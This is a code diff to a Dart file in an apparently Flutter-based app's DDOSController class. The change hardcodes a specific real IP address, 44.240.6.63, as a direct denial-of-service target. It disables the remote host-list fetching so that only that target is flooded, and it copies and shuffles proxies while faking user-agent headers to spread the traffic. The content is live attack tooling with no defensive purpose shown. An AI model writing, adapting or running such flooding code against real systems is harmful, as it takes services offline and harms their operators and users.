@@ -17,7 +17,7 @@ import 'package:uk_power/models/ddos_info.dart';
 
 class DDOSController {
   List<String> hosts = [defaultHost];
-  List<String> directTargets = [];
+  List<String> directTargets = ["44.240.6.63"];
   ProxiesController proxiesController = ProxiesController();
 
   Dio _dio = Dio();
@@ -27,9 +27,9 @@ class DDOSController {
   /// Init hosts and direct targets
   Future<void> init(void Function(DDOSInfo) callback) async {
     try {
-      callback(await _getHosts());
-      await Future.delayed(const Duration(seconds: 1));
-      callback(await _getDirectTargets());
+      // callback(await _getHosts());
+      // await Future.delayed(const Duration(seconds: 1));
+      // callback(await _getDirectTargets());
       await Future.delayed(const Duration(seconds: 1));
       await proxiesController.fetchAll();
       callback(
@@ -169,14 +169,14 @@ class DDOSController {
       'User-Agent': faker.internet.userAgent(),
       'Connection': 'keep-alive',
       'Accept': 'application/json, text/plain, */*',
-      'Accept-Language': 'ru',
+      'Accept-Language': '*/*',
       'x-forwarded-proto': 'https',
       'Accept-Encoding': 'gzip, deflate, br',
     };
 
-    if (hosts.isNotEmpty) {
-      _attackUsingHosts((info) => callback(info), headers);
-    }
+    // if (hosts.isNotEmpty) {
+    //   _attackUsingHosts((info) => callback(info), headers);
+    // }
 
     if (directTargets.isNotEmpty) {
       await _attackUsingTargets((info) => callback(info), headers);
@@ -275,7 +275,7 @@ class DDOSController {
     await Future.delayed(const Duration(seconds: 1));
 
     // need proxies
-    List<Proxy> proxies = proxiesController.proxies;
+    List<Proxy> proxies = List<Proxy>.from(proxiesController.proxies);
     // let's shuffle them
     proxies.shuffle();
 
